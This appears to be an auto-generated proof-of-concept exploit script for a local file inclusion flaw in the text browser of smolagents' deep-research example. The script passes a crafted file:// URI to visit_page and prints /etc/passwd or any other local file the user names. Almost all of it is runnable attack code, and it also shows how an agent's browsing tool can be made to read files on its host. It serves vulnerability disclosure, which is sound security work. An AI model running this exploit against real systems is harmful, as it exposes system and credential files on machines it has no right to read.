#!/usr/bin/env python3
# PoC for smolagents (/tmp/smolagents)
# Path: suspicious-007
# Sink: _fetch_page
# Auto-generated — run with: python3 lfi_uri_pointing_any_local__fetch_page.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in smolagents SimpleTextBrowser

Vulnerability: The `_fetch_page` method in `SimpleTextBrowser` unsafely handles
`file://` URIs by extracting the path without any directory whitelist, allowing
an attacker to read arbitrary local files.

This script demonstrates the issue by reading `/etc/passwd` (or a user-specified
file) using the vulnerable browser component.
"""

import argparse
import sys
import tempfile
import os

def main():
    parser = argparse.ArgumentParser(
        description="PoC for smolagents LFI – reads an arbitrary local file via file:// URI"
    )
    parser.add_argument(
        "--target",
        default="/etc/passwd",
        help="Path to the local file to read (default: /etc/passwd)"
    )
    args = parser.parse_args()

    # Attempt to import the vulnerable class
    try:
        from smolagents.examples.open_deep_research.scripts.text_web_browser import SimpleTextBrowser
    except ImportError as e:
        print(f"[!] Failed to import SimpleTextBrowser: {e}")
        print("[!] Make sure smolagents is installed and the module path is correct.")
        sys.exit(1)

    # Create a temporary directory for downloads (the browser expects a writable folder)
    temp_dir = tempfile.mkdtemp(prefix="smolagents_poc_")
    print(f"[*] Using temporary downloads folder: {temp_dir}")

    # Instantiate the browser with minimal configuration.
    browser = SimpleTextBrowser(downloads_folder=temp_dir)

    # Craft the malicious file:// URI
    # The browser will unquote the path and read it directly.
    file_uri = f"file://{os.path.abspath(args.target)}"
    print(f"[*] Attempting to read: {file_uri}")

    try:
        # Trigger the vulnerable code path
        result = browser.visit_page(file_uri)
        # The browser stores page content in self.viewport, but visit_page returns viewport
        print("[+] Success! Page content retrieved:")
        print("-" * 60)
        print(result)
        print("-" * 60)
    except FileNotFoundError:
        print(f"[!] The file '{args.target}' does not exist (or cannot be read).")
    except Exception as e:
        print(f"[!] Unexpected error during exploit: {e}")
    finally:
        # Clean up temporary directory
        try:
            os.rmdir(temp_dir)
        except OSError:
            pass

if __name__ == "__main__":
    main()
